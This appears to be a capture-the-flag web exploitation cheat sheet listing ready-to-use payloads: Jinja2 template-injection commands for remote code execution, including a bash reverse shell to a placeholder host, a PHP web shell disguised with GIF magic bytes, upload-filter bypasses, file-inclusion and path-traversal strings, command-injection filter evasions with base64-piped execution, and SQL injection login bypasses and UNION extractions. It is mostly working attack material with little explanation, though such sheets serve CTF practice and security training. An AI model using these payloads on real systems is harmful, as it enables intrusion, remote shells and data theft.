# Web Exploitation Payloads (Dynamic Instances)

## 1. Server-Side Template Injection (SSTI)

### Identification:
Submit these in search/input fields and observe output:
- `{{7*7}}` $\rightarrow$ returns `49` (Flask/Jinja2 or Twig)
- `${7*7}` $\rightarrow$ returns `49` (Java/Spring, Smarty, or PHP)
- `{{7*'7'}}` $\rightarrow$ returns `7777777` (Jinja2) vs `49` (Twig)

### Jinja2 (Flask / Python) RCE Payloads:
```jinja2
# Read /etc/passwd:
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Reverse shell:
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"').read() }}

# Filter bypass if 'class' or 'globals' or quotes are blocked:
{{ request.application.__globals__.__builtins__.__import__('os').popen(request.args.cmd).read() }}&cmd=cat+/flag*
```

---

## 2. File Upload Bypasses

When the application blocks `.php`:
1. **Alternative PHP extensions**:
   - `.phtml`, `.php3`, `.php4`, `.php5`, `.php7`, `.phps`, `.phar`
2. **Double Extensions & Null Bytes**:
   - `shell.php.jpg`, `shell.php%00.jpg`, `shell.php.png`
3. **Magic Bytes (MIME Type Spoofing)**:
   Prepend GIF header to your PHP shell:
   ```php
   GIF89a;
   <?php system($_GET['cmd']); ?>
   ```
   *In Burp Suite*: Change `Content-Type: application/x-php` $\rightarrow$ `Content-Type: image/png` or `image/jpeg`.

---

## 3. Local File Inclusion (LFI) & PHP Wrappers

### Reading Source Code (Base64 Filter):
```text
http://<IP>/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://<IP>/index.php?page=php://filter/convert.base64-encode/resource=config.php
```
*(Copy base64 result into `base64 -d` to get PHP source code!)*

### Path Traversal & Null Byte:
```text
../../../../etc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd
/etc/passwd%00
```

---

## 4. Command Injection Bypasses

### Bypassing Space Restrictions:
When space (` `) is filtered by WAF:
```bash
cat$IFS/flag.txt
cat${IFS}/flag.txt
cat<$IFS/flag.txt
{cat,/flag.txt}
```

### Bypassing Keyword Blacklists (e.g. `cat` or `flag`):
```bash
c''at /fl*
c""at /fl?g
c\at /f'l'ag.txt
$(tr "[A-Z]" "[a-z]"<<<"CAT") /flag
# Base64 execution:
echo "Y2F0IC9mbGFn" | base64 -d | sh
```

---

## 5. SQL Injection (SQLi)

### Auth Bypass (Login forms):
```sql
admin'--
admin' #
admin' or 1=1--
' OR 1=1 LIMIT 1--
```

### Quick UNION Extraction (SQLite / MySQL):
```sql
' UNION SELECT null, null, null--
' UNION SELECT null, sqlite_version(), null--
' UNION SELECT null, sql, null FROM sqlite_master WHERE type='table'--
' UNION SELECT null, flag, null FROM flag--
```
